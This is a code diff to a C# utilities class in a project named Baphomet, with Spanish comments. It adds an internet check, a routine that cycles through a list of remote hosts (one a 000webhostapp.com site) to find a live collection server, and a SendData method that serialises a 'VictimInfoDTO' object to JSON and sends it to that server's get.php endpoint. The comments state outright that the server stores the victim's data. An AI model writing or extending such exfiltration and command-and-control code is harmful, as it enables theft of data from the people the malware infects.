@@ -36,11 +36,19 @@ namespace Baphomet.Utilities
         {
             try
             {
-                using (var client = new WebClient())
-                using (client.OpenRead("http://google.com/generate_204"))
+                Ping ping = new Ping();
+                PingReply reply = ping.Send(IPAddress.Parse("8.8.8.8"));
+
+                if (reply.Status == IPStatus.Success)
+                {
                     return true;
+                }
+                else
+                {
+                    return false;
+                }
             }
-            catch
+            catch (Exception ex)
             {
                 return false;
             }
@@ -48,22 +56,50 @@ namespace Baphomet.Utilities
 
         public string HostName()
         {
+            var liveHost = "noLive";
+            //Archivo que estara alojado en nuestro host encargado de escribir y guardar la data de la victima.
+            var phpWriter = "/get.php";
+
             //Aqui va mi lista de host en caso de que uno de ellos falle.
+            //En cada Host tendre un archivo el cual intentare leer, si la peticion se cumple con exito es por que el host esta vivo.
             var hostList = new []
             {
-                //"https://wwww.MyExamplehost.com/write.php?info=",
-                "https://baphomettest.000webhostapp.com/get.php?info="
+                "https://wwww.MyExamplehost.com/FileToRead",
+                "https://baphomettest.000webhostapp.com/Hailbaphomet.jpg",
+                "https://wwww.MyExamplehost.com/FileToRead"
             };
 
-            Ping ping = new Ping();
-            PingReply reply = ping.Send(IPAddress.Parse("https://baphomettest.000webhostapp.com/"));
+            foreach (var host in hostList)
+            {
+                try
+                {
+                    using (var client = new WebClient())
+                    using (client.OpenRead(host))
+                        liveHost = host;
+                    break;
+                }
+                catch (Exception ex)
+                {
+                    Console.WriteLine("Error:" + ex.Message);
+                }
+            }
 
-            if (reply.Status == IPStatus.Success)
-                Console.WriteLine("Address is accessible");
+            if (liveHost != "noLive")
+            {
+                int index = liveHost.LastIndexOf("/");
+                if (index > 0)
+                    liveHost = liveHost.Substring(0, index);
 
-            var hostUp = "";
+                return liveHost + phpWriter + "?info=";
+            }
+            return liveHost;
+        }
 
-            return hostUp;
+        public void SendData(VictimInfoDTO victimInfo, string host)
+        {
+            var jsonData = JsonConvert.SerializeObject(victimInfo);
+            var content = host + jsonData;
+            var sender = new WebClient().DownloadString(content);
         }
     }
 }
